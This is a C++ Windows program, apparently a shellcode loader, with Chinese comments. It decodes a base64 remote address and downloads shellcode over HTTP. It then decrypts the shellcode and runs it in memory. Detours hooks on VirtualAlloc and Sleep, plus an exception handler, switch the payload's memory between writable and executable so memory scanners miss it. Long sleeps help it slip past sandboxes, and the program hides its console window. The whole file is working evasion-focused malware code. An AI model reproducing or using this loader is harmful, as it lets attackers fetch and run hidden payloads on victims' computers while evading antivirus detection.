//# include "pch.h"
# include <iostream>
# include<Windows.h>
# include "http.h"
# include "base64.h"
# include "detours.h"
# include "detver.h"
#pragma comment(lib,"detours.lib")
#pragma warning(disable : 4996)
#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")


LPVOID bess;
SIZE_T bdlen;
DWORD bmadf;
HANDLE hEvent;


BOOL Vir_FLAG = TRUE;
LPVOID bsssscc;


static LPVOID(WINAPI* OldVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = VirtualAlloc;
LPVOID WINAPI NewVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
	bdlen = dwSize;
	bess = OldVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
	return bess;
}

static VOID(WINAPI* OldSleep)(DWORD dwMilliseconds) = Sleep;
void WINAPI NewSleep(DWORD dwMilliseconds)
{
	if (Vir_FLAG)
	{
		VirtualFree(bsssscc, 0, MEM_RELEASE);
		Vir_FLAG = false;
	}
	SetEvent(hEvent);
	OldSleep(dwMilliseconds);
}



size_t GetSize(char* szFilePath)
{
	size_t size;
	FILE* f = fopen(szFilePath, "rb");
	fseek(f, 0, SEEK_END);
	size = ftell(f);
	rewind(f);
	fclose(f);
	return size;
}

unsigned char* ReadBinaryFile(char* szFilePath, size_t* size)
{
	unsigned char* p = NULL;
	FILE* f = NULL;
	size_t res = 0;
	*size = GetSize(szFilePath);
	if (*size == 0) return NULL;
	f = fopen(szFilePath, "rb");
	if (f == NULL)
	{
		return 0;
	}
	p = new unsigned char[*size];
	// Read file
	rewind(f);
	res = fread(p, sizeof(unsigned char), *size, f);
	fclose(f);
	if (res == 0)
	{
		delete[] p;
		return NULL;
	}
	return p;
}

BOOL is_Exception(DWORD64 Exception_addr)
{
	if (Exception_addr < ((DWORD64)bess + bdlen) && Exception_addr >(DWORD64)bess)
	{
		return true;
	}

	return false;
}

LONG NTAPI FirstVectExcepHandler(PEXCEPTION_POINTERS pExcepInfo)
{

	if (pExcepInfo->ExceptionRecord->ExceptionCode == 0xc0000005 && is_Exception(pExcepInfo->ContextRecord->Rip))
	{
		VirtualProtect(bess, bdlen, PAGE_EXECUTE_READWRITE, &bmadf);
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	return EXCEPTION_CONTINUE_SEARCH;
}

DWORD WINAPI bsmmm(LPVOID lpParameter)
{
	while (true)
	{
		WaitForSingleObject(hEvent, INFINITE);
		VirtualProtect(bess, bdlen, PAGE_READWRITE, &bmadf);
		ResetEvent(hEvent);
	}
	return 0;
}
void aaa()
{
	DetourRestoreAfterWith();
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach((PVOID*)&OldVirtualAlloc, NewVirtualAlloc);
	DetourAttach((PVOID*)&OldSleep, NewSleep);
	DetourTransactionCommit();
}

void bbb()
{
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourDetach((PVOID*)&OldVirtualAlloc, NewVirtualAlloc);
	DetourTransactionCommit();
}

int main()
{
	size_t dataSize = 0;
	char* pData = NULL;
	hEvent = CreateEvent(NULL, TRUE, false, NULL);

	AddVectoredExceptionHandler(1, &FirstVectExcepHandler);
	aaa(); //hook
	HANDLE hThread1 = CreateThread(NULL, 0, bsmmm, NULL, 0, NULL);
	CloseHandle(hThread1);

	std::string a = ""; //shellcoede 远程地址 （内容，地址均base64编码,内容不完全预设了一部分到ReadBase64）
	std::string b;
	b = base64_decode2(a); //解码 下载地址

	const char* HTTP = b.c_str();
	pData = HttpReceive(HTTP, dataSize); //下载shellcode
	
	
	pData = (char*)ReadBase64(pData, dataSize); //shellcode 解密（加上预设的一部分shellcode）
	Sleep(10000);
	bsssscc = VirtualAlloc(NULL, dataSize, MEM_COMMIT, PAGE_READWRITE);
	Sleep(10000);
	memcpy(bsssscc, pData, dataSize);
	Sleep(10000);
	VirtualProtect(bsssscc, dataSize, PAGE_EXECUTE_READWRITE, &bmadf);
	(*(int(*)()) bsssscc)();

	bbb();//unhook

	return 0;
}
